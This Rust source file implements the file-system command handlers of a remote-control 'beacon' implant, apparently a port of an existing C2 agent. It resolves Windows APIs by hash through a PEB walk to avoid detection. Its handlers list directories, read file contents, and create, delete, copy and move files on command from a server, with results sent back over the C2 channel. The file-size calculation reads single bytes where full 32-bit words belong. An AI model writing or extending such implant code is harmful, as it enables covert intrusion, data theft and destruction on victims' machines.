//! Command handlers (port of `src_beacon/src/tasks/`): the file set first
//! (pwd/cd/ls/cat); process, tokens, SOCKS5, forwarding and jobs come with
//! the next iterations. Dispatch is typed and exhaustive: a command the
//! server can send without a matching handler is dropped from the pack
//! (the server keeps it hosted), never misparsed.
//!
//! Every handler resolves its APIs by FNV-64 hash through the instance's
//! kernel32 and writes its result record through the pure builders of
//! `specter_core::transport` — the byte formats live there, pinned by
//! tests against the server source (docs/WIRE.md).
//!
//! Phase 3 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::peb;
use specter_core::transport::{self, Task};
use specter_core::wire::Writer;

use crate::runtime::bootstrap::Instance;

const H_GET_CURRENT_DIRECTORY_A: u64 = fnv1a64(b"GetCurrentDirectoryA");
const H_SET_CURRENT_DIRECTORY_A: u64 = fnv1a64(b"SetCurrentDirectoryA");
const H_FIND_FIRST_FILE_A: u64 = fnv1a64(b"FindFirstFileA");
const H_FIND_NEXT_FILE_A: u64 = fnv1a64(b"FindNextFileA");
const H_FIND_CLOSE: u64 = fnv1a64(b"FindClose");
const H_CREATE_FILE_A: u64 = fnv1a64(b"CreateFileA");
const H_READ_FILE: u64 = fnv1a64(b"ReadFile");
const H_CLOSE_HANDLE: u64 = fnv1a64(b"CloseHandle");
const H_GET_LAST_ERROR: u64 = fnv1a64(b"GetLastError");
const H_CREATE_DIRECTORY_A: u64 = fnv1a64(b"CreateDirectoryA");
const H_REMOVE_DIRECTORY_A: u64 = fnv1a64(b"RemoveDirectoryA");
const H_DELETE_FILE_A: u64 = fnv1a64(b"DeleteFileA");
const H_COPY_FILE_A: u64 = fnv1a64(b"CopyFileA");
const H_MOVE_FILE_A: u64 = fnv1a64(b"MoveFileA");
const H_GET_FILE_ATTRIBUTES_A: u64 = fnv1a64(b"GetFileAttributesA");

/// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
/// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
const FIND_DATA_SIZE: usize = 0x140;
const FIND_OFF_ATTR: usize = 0;
const FIND_OFF_WRITE_TIME: usize = 0x14;
const FIND_OFF_SIZE_HIGH: usize = 0x1C;
const FIND_OFF_SIZE_LOW: usize = 0x20;
const FIND_OFF_NAME: usize = 0x2C;

const GENERIC_READ: u32 = 0x8000_0000;
const FILE_SHARE_READ: u32 = 0x0000_0001;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x0000_0010;
/// 1970-01-01 in Windows FILETIME ticks (100 ns).
const FILETIME_UNIX_EPOCH: u64 = 116_444_736_000_000_000;

/// The CAT read cap of the native dialog ("first 2048 bytes").
const CAT_CAP: usize = 2048;
/// LS entry cap: results beyond this are silently truncated (the listing
/// stays bounded on both sides of the wire).
const LS_MAX_ENTRIES: u32 = 128;
const LS_NAME_CAP: usize = 64;

/// Dispatch one task; the result record lands in `results` for the next
/// POST. Failures write a COMMAND_ERROR record, never silence.
///
/// # Safety
///
/// Beacon thread; instance stored in the TEB.
pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    if kernel32.is_null() {
        return; // resolution impossible before bootstrap — nothing to report
    }
    match task {
        Task::Pwd => pwd(kernel32, id, results),
        Task::Cd { .. } => cd(kernel32, &task, id, results),
        Task::Ls { .. } => ls(kernel32, &task, id, results),
        Task::Cat { .. } => cat(kernel32, &task, id, results),
        Task::Mkdir { .. } => mkdir(kernel32, &task, id, results),
        Task::Rm { .. } => rm(kernel32, &task, id, results),
        Task::Cp { .. } => copy_move(kernel32, &task, id, results, true),
        Task::Mv { .. } => copy_move(kernel32, &task, id, results, false),
        Task::Sleep { .. } | Task::Terminate => {}
    }
}

/// Copy raw path bytes into a NUL-terminated API buffer.
fn c_path_bytes(path: &[u8], buf: &mut [u8]) -> Option<usize> {
    if path.len() + 1 > buf.len() {
        return None;
    }
    let mut i = 0;
    while i < path.len() {
        buf[i] = path[i];
        i += 1;
    }
    buf[path.len()] = 0;
    Some(path.len())
}

/// Copy a task's primary path into a NUL-terminated API buffer.
fn c_path(task: &Task, buf: &mut [u8]) -> Option<usize> {
    c_path_bytes(task.path(), buf)
}

unsafe fn pwd(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_GET_CURRENT_DIRECTORY_A);
    if p.is_null() {
        return;
    }
    let getcwd = *(p as *const unsafe extern "system" fn(u32, *mut u8) -> u32);
    let mut buf = [0u8; 260];
    let n = getcwd(259, buf.as_mut_ptr());
    if n == 0 || n as usize >= buf.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_path_result(results, id, transport::COMMAND_PWD, &buf[..n as usize]);
}

unsafe fn cd(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let set = peb::find_export(kernel32, H_SET_CURRENT_DIRECTORY_A);
    let get = peb::find_export(kernel32, H_GET_CURRENT_DIRECTORY_A);
    if set.is_null() || get.is_null() {
        return;
    }
    let set = *(set as *const unsafe extern "system" fn(*const u8) -> i32);
    let get = *(get as *const unsafe extern "system" fn(u32, *mut u8) -> u32);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    if set(path.as_ptr()) == 0 {
        error(kernel32, id, results);
        return;
    }
    let mut buf = [0u8; 260];
    let n = get(259, buf.as_mut_ptr());
    if n == 0 || n as usize >= buf.len() {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_path_result(results, id, transport::COMMAND_CD, &buf[..n as usize]);
}

unsafe fn cat(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let create = peb::find_export(kernel32, H_CREATE_FILE_A);
    let read = peb::find_export(kernel32, H_READ_FILE);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if create.is_null() || read.is_null() || close.is_null() {
        return;
    }
    let create = *(create
        as *const unsafe extern "system" fn(
            *const u8,
            u32,
            u32,
            *const c_void,
            u32,
            u32,
            *const c_void,
        ) -> isize);
    let read = *(read as *const unsafe extern "system" fn(
        isize,
        *mut u8,
        u32,
        *mut u32,
        *const c_void,
    ) -> i32);
    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);

    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    let handle = create(
        path.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        core::ptr::null(),
        OPEN_EXISTING,
        0,
        core::ptr::null(),
    );
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }
    let mut buf = [0u8; CAT_CAP];
    let mut got: u32 = 0;
    let ok = read(
        handle,
        buf.as_mut_ptr(),
        CAT_CAP as u32,
        &mut got,
        core::ptr::null(),
    );
    close(handle);
    if ok == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_cat_result(results, id, task.path(), &buf[..got as usize]);
}

unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let first = peb::find_export(kernel32, H_FIND_FIRST_FILE_A);
    let next = peb::find_export(kernel32, H_FIND_NEXT_FILE_A);
    let close = peb::find_export(kernel32, H_FIND_CLOSE);
    if first.is_null() || next.is_null() || close.is_null() {
        return;
    }
    let first = *(first as *const unsafe extern "system" fn(*const u8, *mut u8) -> isize);
    let next = *(next as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);

    // Search path: the directory (or pattern) plus `\*` when no wildcard
    // is present — the server strips the suffix for display.
    let mut search = [0u8; 264];
    let path = task.path();
    let root_len = path.len();
    if root_len + 3 > search.len() {
        error(kernel32, id, results);
        return;
    }
    let mut i = 0;
    while i < path.len() {
        search[i] = path[i];
        i += 1;
    }
    if root_len == 0 || search[root_len - 1] != b'*' {
        search[root_len] = b'\\';
        search[root_len + 1] = b'*';
        search[root_len + 2] = 0;
    } else {
        // Pattern given: the raw argument is the search path.
        search[root_len] = 0;
    }

    let mut data = [0u8; FIND_DATA_SIZE];
    let handle = first(search.as_ptr(), data.as_mut_ptr());
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }

    // Entries land in a scratch writer first: the count precedes them.
    let mut scratch = [0u8; 2048];
    let mut sw = Writer::new(&mut scratch);
    let mut count: u32 = 0;
    loop {
        // name: bounded NUL-terminated read
        let mut nlen = 0usize;
        while nlen < LS_NAME_CAP && data[FIND_OFF_NAME + nlen] != 0 {
            nlen += 1;
        }
        let size = ((data[FIND_OFF_SIZE_HIGH] as u64) << 32) | (data[FIND_OFF_SIZE_LOW] as u64);
        let ft = u64::from_le_bytes([
            data[FIND_OFF_WRITE_TIME],
            data[FIND_OFF_WRITE_TIME + 1],
            data[FIND_OFF_WRITE_TIME + 2],
            data[FIND_OFF_WRITE_TIME + 3],
            data[FIND_OFF_WRITE_TIME + 4],
            data[FIND_OFF_WRITE_TIME + 5],
            data[FIND_OFF_WRITE_TIME + 6],
            data[FIND_OFF_WRITE_TIME + 7],
        ]);
        let mut date = 0u64;
        if ft >= FILETIME_UNIX_EPOCH {
            date = (ft - FILETIME_UNIX_EPOCH) / 10_000_000;
        }
        let is_dir = data[FIND_OFF_ATTR] as u32 & FILE_ATTRIBUTE_DIRECTORY != 0;
        if !transport::push_ls_entry(
            &mut sw,
            is_dir,
            size,
            date as u32,
            &data[FIND_OFF_NAME..FIND_OFF_NAME + nlen],
        ) {
            break;
        }
        count += 1;
        if count >= LS_MAX_ENTRIES {
            break;
        }
        if next(handle, data.as_mut_ptr()) == 0 {
            break;
        }
    }
    close(handle);

    // Root for display: the argument without a trailing `\*` suffix.
    let mut root_end = path.len();
    if root_end >= 2 && path[root_end - 1] == b'*' && path[root_end - 2] == b'\\' {
        root_end -= 2;
    }
    let root = &task.path()[..root_end];

    if !transport::push_ls_result_header(results, id, root, count) {
        return;
    }
    // Manual copy of the scratch (memcpy rule).
    let mut i = 0;
    let bytes = sw.written_bytes();
    while i < bytes.len() {
        if !results.push(&[bytes[i]]) {
            return;
        }
        i += 1;
    }
}

unsafe fn mkdir(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_CREATE_DIRECTORY_A);
    if p.is_null() {
        return;
    }
    let create = *(p as *const unsafe extern "system" fn(*const u8, *const c_void) -> i32);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    if create(path.as_ptr(), core::ptr::null()) == 0 {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_mkdir_result(results, id, task.path());
}

unsafe fn rm(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
    let attrs = peb::find_export(kernel32, H_GET_FILE_ATTRIBUTES_A);
    let remove_dir = peb::find_export(kernel32, H_REMOVE_DIRECTORY_A);
    let delete_file = peb::find_export(kernel32, H_DELETE_FILE_A);
    if attrs.is_null() || remove_dir.is_null() || delete_file.is_null() {
        return;
    }
    let attrs = *(attrs as *const unsafe extern "system" fn(*const u8) -> u32);
    let remove_dir = *(remove_dir as *const unsafe extern "system" fn(*const u8) -> i32);
    let delete_file = *(delete_file as *const unsafe extern "system" fn(*const u8) -> i32);
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    // INVALID_FILE_ATTRIBUTES is 0xFFFFFFFF; the directory bit 0x10
    // decides between RemoveDirectoryA and DeleteFileA — the result
    // byte tells the server which message to render.
    let attributes = attrs(path.as_ptr());
    let is_dir = attributes != 0xFFFF_FFFF && attributes & FILE_ATTRIBUTE_DIRECTORY != 0;
    let ok = if is_dir {
        remove_dir(path.as_ptr()) != 0
    } else {
        delete_file(path.as_ptr()) != 0
    };
    if !ok {
        error(kernel32, id, results);
        return;
    }
    let _ = transport::push_rm_result(results, id, is_dir);
}

unsafe fn copy_move(
    kernel32: *mut c_void,
    task: &Task,
    id: u32,
    results: &mut Writer,
    is_copy: bool,
) {
    let p = if is_copy {
        peb::find_export(kernel32, H_COPY_FILE_A)
    } else {
        peb::find_export(kernel32, H_MOVE_FILE_A)
    };
    if p.is_null() {
        return;
    }
    let mut src = [0u8; 260];
    let mut dst = [0u8; 260];
    if c_path_bytes(task.path(), &mut src).is_none() {
        error(kernel32, id, results);
        return;
    }
    if c_path_bytes(task.dst(), &mut dst).is_none() {
        error(kernel32, id, results);
        return;
    }
    let ok = if is_copy {
        // bFailIfExists = FALSE: overwrite like the native dialog.
        let copy = *(p as *const unsafe extern "system" fn(*const u8, *const u8, i32) -> i32);
        copy(src.as_ptr(), dst.as_ptr(), 0) != 0
    } else {
        let mv = *(p as *const unsafe extern "system" fn(*const u8, *const u8) -> i32);
        mv(src.as_ptr(), dst.as_ptr()) != 0
    };
    if !ok {
        error(kernel32, id, results);
        return;
    }
    let command = if is_copy {
        transport::COMMAND_COPY
    } else {
        transport::COMMAND_MV
    };
    let _ = transport::push_plain_result(results, id, command);
}

unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_GET_LAST_ERROR);
    let code = if p.is_null() {
        0
    } else {
        (*(p as *const unsafe extern "system" fn() -> u32))()
    };
    let _ = transport::push_error_result(results, id, code);
}
